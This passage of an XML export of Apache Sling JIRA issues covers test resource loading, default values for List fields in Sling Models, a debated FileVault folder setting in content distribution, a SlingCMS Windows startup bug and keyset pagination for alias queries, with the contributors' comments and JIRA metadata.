                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1h0cw:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11815] Let context.load().json() accept class as input, to help resolving files more local to the test class</title>
                <link>https://issues.apache.org/jira/browse/SLING-11815</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When testing functionality in package &quot;a.b.c&quot; for class &quot;X&quot; (in &quot;src/java&quot;) typically the unit test class is created in package &quot;a.b.c&quot; as well, called &quot;XTest&quot; (in &quot;src/test&quot;).&lt;/p&gt;

&lt;p&gt;Sometimes, we want to load resources (such as JSON files) as content in the virtual repository. It would be very convenient if we could load these resources relative to the current package: I.e. by creating the following structure:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;src/test/java/a/b/c/XTest.java&lt;/li&gt;
	&lt;li&gt;src/test/resources/a/b/c/my-content.json&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;and then loading it by using:&lt;br/&gt;
context.load().json(&quot;my-content.json&quot;);&lt;/p&gt;

&lt;p&gt;Of course, the context&apos;s ContentLoader cannot know anything about the class it is being used from, which is why the ContentLoader class is used to load the resource. This could be a default way of doing it. However, it would be nice to send an additional argument to the json()-method, providing the class to use, which could easily be filled in with &quot;getClass()&quot;, to go in the context of the current test class and allows resolving the file in the package as well.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13530954">SLING-11815</key>
            <summary>Let context.load().json() accept class as input, to help resolving files more local to the test class</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="Henry Kuijpers">Henry Kuijpers</reporter>
                        <labels>
                    </labels>
                <created>Fri, 31 Mar 2023 11:03:59 +0000</created>
                <updated>Fri, 31 Mar 2023 11:04:33 +0000</updated>
                                            <version>Testing Sling Mock 3.4.4</version>
                                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 29 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1h028:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11812] Models Impl: Default values for List/Collection fields cannot be injected</title>
                <link>https://issues.apache.org/jira/browse/SLING-11812</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;If a model defines a field like&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
    @Inject
    @Default(values = {&lt;span class=&quot;code-quote&quot;&gt;&quot;v1&quot;&lt;/span&gt;,&lt;span class=&quot;code-quote&quot;&gt;&quot;v2&quot;&lt;/span&gt;})
    &lt;span class=&quot;code-keyword&quot;&gt;private&lt;/span&gt; List&amp;lt;&lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt;&amp;gt; stringList;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;the injection fails due to the List type. it works if an array type is used. this problem affects only the default value, the injection to List and Collection types works for actual values.&lt;/p&gt;

&lt;p&gt;according to &lt;a href=&quot;https://sling.apache.org/documentation/bundles/models.html#available-injectors-1&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://sling.apache.org/documentation/bundles/models.html#available-injectors-1&lt;/a&gt; both List and Collection types are supported for most injectors.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13530402">SLING-11812</key>
            <summary>Models Impl: Default values for List/Collection fields cannot be injected</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="sseifert">Stefan Seifert</assignee>
                                    <reporter username="sseifert">Stefan Seifert</reporter>
                        <labels>
                    </labels>
                <created>Tue, 28 Mar 2023 10:30:17 +0000</created>
                <updated>Wed, 15 Nov 2023 16:41:37 +0000</updated>
                            <resolved>Tue, 28 Mar 2023 11:17:40 +0000</resolved>
                                    <version>Models Implementation 1.5.4</version>
                                    <fixVersion>Models Implementation 1.6.0</fixVersion>
                                    <component>Sling Models</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1200">20m</timespent>
                                <comments>
                            <comment id="17705947" author="sseifert@pro-vision.de" created="Tue, 28 Mar 2023 11:17:40 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-models-impl/commit/13ac77895051340159a81d6ba8a43c1b495d8895&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-models-impl/commit/13ac77895051340159a81d6ba8a43c1b495d8895&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13558107">SLING-12158</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 30 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1gwo0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11809] Disable &quot;overwritePrimaryTypesOfFolders&quot; in the distribution journal</title>
                <link>https://issues.apache.org/jira/browse/SLING-11809</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;By default, &lt;b&gt;overwritePrimaryTypesOfFolders&lt;/b&gt; in AEM is set to &lt;b&gt;false&lt;/b&gt;, which conflicts with the value set to &lt;b&gt;true&lt;/b&gt; in the distribution journal. This mismatch can lead to inconsistencies, as observed with some customers.&lt;/p&gt;

&lt;p&gt;To prevent inconsistencies, ensure that the &lt;b&gt;overwritePrimaryTypesOfFolders&lt;/b&gt; value in the distribution journal aligns with the default value of &lt;b&gt;false&lt;/b&gt; in AEM.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13529784">SLING-11809</key>
            <summary>Disable &quot;overwritePrimaryTypesOfFolders&quot; in the distribution journal</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="1" iconUrl="https://issues.apache.org/jira/images/icons/priorities/blocker.svg">Blocker</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="marett">Timothee Maret</assignee>
                                    <reporter username="balasoiu">Roxana-Elena Balasoiu</reporter>
                        <labels>
                    </labels>
                <created>Thu, 23 Mar 2023 13:53:40 +0000</created>
                <updated>Tue, 28 Mar 2023 07:29:19 +0000</updated>
                            <resolved>Tue, 28 Mar 2023 07:29:19 +0000</resolved>
                                                    <fixVersion>Content Distribution Journal Core 0.2.0</fixVersion>
                                    <component>Content Distribution</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>5</watches>
                                                                                                                <comments>
                            <comment id="17704195" author="joerghoh" created="Thu, 23 Mar 2023 15:08:56 +0000"  >&lt;p&gt;We should not adjust Sling to the way AEM is working.&lt;/p&gt;

&lt;p&gt;If there&apos;s a need to change a hardcoded Sling-default to support AEM requirements, please make this setting configurable and make the Sling behavior the default.&lt;/p&gt;</comment>
                            <comment id="17704216" author="marett" created="Thu, 23 Mar 2023 15:38:49 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=joerghoh&quot; class=&quot;user-hover&quot; rel=&quot;joerghoh&quot;&gt;joerghoh&lt;/a&gt; agreed in general, but IINM in this case the proposed changes sets the behaviour as it was with FV 3.4.0. Arguably Sling users want behavioural backward compatibility the same way AEM users do.&lt;/p&gt;</comment>
                            <comment id="17704254" author="joerghoh" created="Thu, 23 Mar 2023 16:53:06 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=marett&quot; class=&quot;user-hover&quot; rel=&quot;marett&quot;&gt;marett&lt;/a&gt; understood. But in that case wouldn&apos;t it be an regression on Filevault, which required changes on consumer side to make it work as before?&lt;/p&gt;

&lt;p&gt;(I wouldn&apos;t have written this comment, if this would have been outlined as such. But justifying changes in Sling with references to AEM always have a certain smell ...)&lt;/p&gt;</comment>
                            <comment id="17704299" author="kwin" created="Thu, 23 Mar 2023 18:21:59 +0000"  >&lt;p&gt;&lt;tt&gt;overwritePrimaryTypesOfFolders&lt;/tt&gt; is deliberately set to &lt;tt&gt;true&lt;/tt&gt; by default in FileVault as the old behaviour was rather a bug than a feature. When AEM decides to rather revert to the old (erroneous) behaviour that is fine, but should not have an impact on Sling&apos;s default behaviour. I am strongly advocating for reverting this fix and rather come up with an AEM specific fix inside AEM.&lt;/p&gt;</comment>
                            <comment id="17704319" author="joerghoh" created="Thu, 23 Mar 2023 19:01:21 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; on the other hand, if FileVault changes behavior to fix an issue (which was considered as feature by others) I would rather want that FileVault has a switch to re-enable this old buggy behavior.&lt;/p&gt;</comment>
                            <comment id="17704321" author="kwin" created="Thu, 23 Mar 2023 19:03:09 +0000"  >&lt;p&gt;It has, that toggle was used in the PR. But again let&#8217;s not make that buggy behavior the default in Sling&lt;/p&gt;</comment>
                            <comment id="17704535" author="marett" created="Fri, 24 Mar 2023 09:19:40 +0000"  >&lt;p&gt;So, to satisfy everyone we could add a configuration that enables the new FV behaviour (overwritePrimaryTypesOfFolders = true) by default in Sling.&#160;&lt;/p&gt;

&lt;p&gt;I suggest to add the property &quot;contentPackageExtractor.overwritePrimaryTypesOfFolders=true&quot; in o.a.s.d.j.i.s.DistributionSubscriber. AEM would set that property to false to enable the old FV behaviour.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=dbanjac&quot; class=&quot;user-hover&quot; rel=&quot;dbanjac&quot;&gt;dbanjac&lt;/a&gt; would you be able to open a new PR with that configuration ?&lt;/p&gt;</comment>
                            <comment id="17705785" author="JIRAUSER299488" created="Tue, 28 Mar 2023 03:48:43 +0000"  >&lt;p&gt;I&apos;ve created a new PR (linked in the ticket). Review is appreciated. Thanks.&lt;/p&gt;</comment>
                            <comment id="17705851" author="marett" created="Tue, 28 Mar 2023 07:29:00 +0000"  >&lt;p&gt;Thank you &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=dbanjac&quot; class=&quot;user-hover&quot; rel=&quot;dbanjac&quot;&gt;dbanjac&lt;/a&gt; ! Reviewed and merged by &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cschneid&quot; class=&quot;user-hover&quot; rel=&quot;cschneid&quot;&gt;cschneid&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13025831">JCRVLT-142</issuekey>
        </issuelink>
            <issuelink>
            <issuekey id="13287483">JCRVLT-415</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 30 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1gsuw:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11808] Cannot run SlingCMS 1.1.2+ on Windows</title>
                <link>https://issues.apache.org/jira/browse/SLING-11808</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Hi, I haven&apos;t used SlingCMS for a long time.&lt;br/&gt;
I downloaded the latest version today and tried it out, but I can&apos;t run the program.&lt;/p&gt;

&lt;p&gt;It shows:&lt;/p&gt;

&lt;p&gt;Artifact jar:&lt;a href=&quot;file:/C:/Test/SlingCMS/org.apache.sling.cms.feature-1.1.2.jar!/lib/slingcms.far&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;file:/C:/Test/SlingCMS/org.apache.sling.cms.feature-1.1.2.jar!/lib/slingcms.far&lt;/a&gt; not found.&lt;/p&gt;

&lt;p&gt;OS Windows 10, Java 8, SlingCMS 1.1.0 works fine, expect subsequent versions to fix this problem.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13528916">SLING-11808</key>
            <summary>Cannot run SlingCMS 1.1.2+ on Windows</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="James.R">James Raynor</reporter>
                        <labels>
                    </labels>
                <created>Fri, 17 Mar 2023 07:59:26 +0000</created>
                <updated>Thu, 9 Nov 2023 04:34:28 +0000</updated>
                            <resolved>Thu, 20 Apr 2023 14:33:23 +0000</resolved>
                                    <version>App CMS 1.1.2</version>
                                    <fixVersion>App CMS 1.1.8</fixVersion>
                                    <component>App CMS</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17701930" author="dklco" created="Fri, 17 Mar 2023 18:11:50 +0000"  >&lt;p&gt;Thanks for the report &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=James.R&quot; class=&quot;user-hover&quot; rel=&quot;James.R&quot;&gt;James.R&lt;/a&gt; can you try it with Java 11 on windows? Trying to nail down the scope of the issue.&lt;/p&gt;</comment>
                            <comment id="17702400" author="james.r" created="Mon, 20 Mar 2023 01:58:38 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=dklco&quot; class=&quot;user-hover&quot; rel=&quot;dklco&quot;&gt;dklco&lt;/a&gt; &#160;I changed java 11 (OS: Win10), the test results are the same as above, 1.1.0 version is ok, 1.1.2 can not run.&lt;/p&gt;</comment>
                            <comment id="17704153" author="dklco" created="Thu, 23 Mar 2023 13:43:54 +0000"  >&lt;p&gt;Thanks &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=James.R&quot; class=&quot;user-hover&quot; rel=&quot;James.R&quot;&gt;James.R&lt;/a&gt;! It looks like it was an issue with the Feature Model&apos;s caching paths (it wasn&apos;t escaping non-Windows path characters). Updating the dependencies resolved the issue.&#160;&lt;/p&gt;

&lt;p&gt;I&apos;ve got a branch with the changes here: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-app-cms/tree/SLING-11808&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-app-cms/tree/SLING-11808&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17704422" author="james.r" created="Fri, 24 Mar 2023 02:57:22 +0000"  >&lt;p&gt;Hello, I see, when the subsequent release of the update I will test again, thank you &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=dklco&quot; class=&quot;user-hover&quot; rel=&quot;dklco&quot;&gt;dklco&lt;/a&gt; .&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                            <attachment id="13056444" name="2023-03-17--15-55-28.jpg" size="119829" author="James.R" created="Fri, 17 Mar 2023 07:57:58 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>1.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 30 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1gni8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11799] use keyset pagination for sling:alias query</title>
                <link>https://issues.apache.org/jira/browse/SLING-11799</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Similar to what was done for vanity paths (&lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11581&quot; title=&quot;use keyset pagination for vanity path query&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11581&quot;&gt;&lt;del&gt;SLING-11581&lt;/del&gt;&lt;/a&gt;), we should use keyset pagination for queries for sling:alias.&lt;/p&gt;

&lt;p&gt;This would work the same in principle, however we should keep in mind that - due to the different type of data - we may have way more duplicates, so in edge cases the pages might be bigger than expected. However, every size reduction of &quot;results of a single query&quot; should help.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13527656">SLING-11799</key>
            <summary>use keyset pagination for sling:alias query</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="reschke">Julian Reschke</assignee>
                                    <reporter username="reschke">Julian Reschke</reporter>
                        <labels>
                    </labels>
                <created>Wed, 8 Mar 2023 15:19:25 +0000</created>
                <updated>Thu, 15 Aug 2024 16:43:35 +0000</updated>
                            <resolved>Tue, 9 Jan 2024 09:31:51 +0000</resolved>
                                                    <fixVersion>Resource Resolver 1.11.6</fixVersion>
                                    <component>ResourceResolver</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17760896" author="reschke" created="Thu, 31 Aug 2023 12:18:45 +0000"  >&lt;p&gt;I wonder whether it would be good to count the distinct alias names (or even the distinct first names in the alias array), and to report them as metrics. Or would it be sufficient to log that?&lt;/p&gt;</comment>
                            <comment id="17760936" author="reschke" created="Thu, 31 Aug 2023 13:36:12 +0000"  >&lt;p&gt;Turns out that the number of distinct names is not &lt;b&gt;that&lt;/b&gt; interesting. What would be needed is the (first) alias that has the most occurrences.&lt;/p&gt;

&lt;p&gt;Assuming that aliases do not change that much, finding these during startup, logging interesting findings, and throwing away the data structure should be good enough.&lt;/p&gt;</comment>
                            <comment id="17802891" author="tmueller" created="Thu, 4 Jan 2024 10:27:06 +0000"  >&lt;p&gt;&amp;gt; What would be needed is the (first) alias that has the most occurrences.&lt;/p&gt;

&lt;p&gt;From the data I have analyzed, some of the values have more than 10&apos;000 entries. So it&apos;s better to use a dynamic limit:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;select without limit, order by first alias&lt;/li&gt;
	&lt;li&gt;read from the result set &lt;em&gt;until&lt;/em&gt; the first alias is different, but at least 1&apos;000 (both conditions need to be met)&lt;/li&gt;
	&lt;li&gt;the next page can then continue with the new value&lt;/li&gt;
&lt;/ul&gt;
</comment>
                            <comment id="17803164" author="reschke" created="Thu, 4 Jan 2024 13:32:09 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=thomasm&quot; class=&quot;user-hover&quot; rel=&quot;thomasm&quot;&gt;thomasm&lt;/a&gt; - that&apos;s what the PR imho does.&lt;/p&gt;</comment>
